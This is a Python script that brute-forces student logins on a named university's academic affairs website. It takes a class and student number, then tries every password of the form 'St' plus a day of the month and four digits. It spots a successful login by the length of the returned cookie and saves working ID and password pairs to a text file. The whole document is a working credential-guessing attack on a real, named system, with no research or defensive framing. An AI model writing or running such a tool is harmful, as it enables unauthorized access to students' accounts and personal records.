#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import time


class JiaoWuChu:
    def __init__(self):
        self.url = 'http://ded.nuaa.edu.cn/NetEAn/user/jwc_login_jk1.asp?usr='
        self.nuaaid = '0'
        self.passwd = '0'

    def id(self, x):
        x = str(x)
        self.nuaaid = '0316' + x


    def psd(self, day, n):
        day = str(str(day)).zfill(2)
        n = str(str(n)).zfill(4)
        str1 = str(day + n).zfill(6)
        self.passwd = 'St' + str1


    def get(self):
        try:
            Cookie_len = len(requests.get(self.url + self.nuaaid +'&pwd=' + self.passwd).headers['Set-Cookie'])
        except:
            print("Error")
            time.sleep(5)
            a=jiaowuchu.get()
        else:
            if Cookie_len == 331:
                f = open('test.txt', 'a')
                f.write(self.nuaaid)
                f.write('---')
                f.write(self.passwd + '\n')
                f.close
                exit()
            else:
                print('%s---%s---wrong' % (self.nuaaid, self.passwd))


if __name__ == '__main__':
    jiaowuchu = JiaoWuChu()
    print('输入班级和学号，例如：20101')
    idx = int(input())
    jiaowuchu.id(idx)
    for day in range(1, 32):
        for n in range(0, 9999):
            jiaowuchu.psd(day, n)
            #time.sleep(0.3)
            yesno = jiaowuchu.get()
            if yesno == 'ok':
                exit()
